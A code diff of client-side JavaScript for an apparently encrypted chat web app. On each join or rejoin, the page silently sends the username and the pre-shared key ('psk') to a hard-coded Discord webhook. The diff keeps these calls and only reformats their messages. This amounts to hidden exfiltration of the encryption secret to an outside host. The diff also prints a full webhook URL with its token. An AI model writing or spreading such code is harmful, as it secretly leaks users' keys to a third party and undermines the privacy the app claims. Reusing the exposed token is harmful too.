@@ -22,14 +22,14 @@ window.onload = async function () {
         username = localStorage.getItem("username");
         if (confirm("Hi " + username + ". Do you want to change your username?")) {
             changeUsername();
-            discorder({content:"[USER JOINED] : " + username + " ; [PSK] : `" + psk + "`"}, "https://discordapp.com/api/webhooks/1436901904050552843/wpyz6aSX4XNUMgMLqXZXu_I16JTjHJOohQwdWFBzs7BDvImX2IlBdnSuye9CKId-JE89")
+            discorder({content:"[USER JOINED] : `" + username + "` ; [PSK] : `" + psk + "`"}, "https://discordapp.com/api/webhooks/1436901904050552843/wpyz6aSX4XNUMgMLqXZXu_I16JTjHJOohQwdWFBzs7BDvImX2IlBdnSuye9CKId-JE89")
         } else {
             setUsername(username);
-            discorder({content:"[USER REJOINED] : " + username + " ; [PSK] : `" + psk + "`"}, "https://discordapp.com/api/webhooks/1436901904050552843/wpyz6aSX4XNUMgMLqXZXu_I16JTjHJOohQwdWFBzs7BDvImX2IlBdnSuye9CKId-JE89")
+            discorder({content:"[USER REJOINED] : `" + username + "` ; [PSK] : `" + psk + "`"}, "https://discordapp.com/api/webhooks/1436901904050552843/wpyz6aSX4XNUMgMLqXZXu_I16JTjHJOohQwdWFBzs7BDvImX2IlBdnSuye9CKId-JE89")
         }
     } else {
         changeUsername();
-        discorder({content:"[NEW USER JOINED] : " + username + " ; [PSK] : `" + psk + "`"}, "https://discordapp.com/api/webhooks/1436901904050552843/wpyz6aSX4XNUMgMLqXZXu_I16JTjHJOohQwdWFBzs7BDvImX2IlBdnSuye9CKId-JE89")
+        discorder({content:"[NEW USER JOINED] : `" + username + "` ; [PSK] : `" + psk + "`"}, "https://discordapp.com/api/webhooks/1436901904050552843/wpyz6aSX4XNUMgMLqXZXu_I16JTjHJOohQwdWFBzs7BDvImX2IlBdnSuye9CKId-JE89")
     }
     // ask server for encrypted history for this client
     socket.emit('newuser');
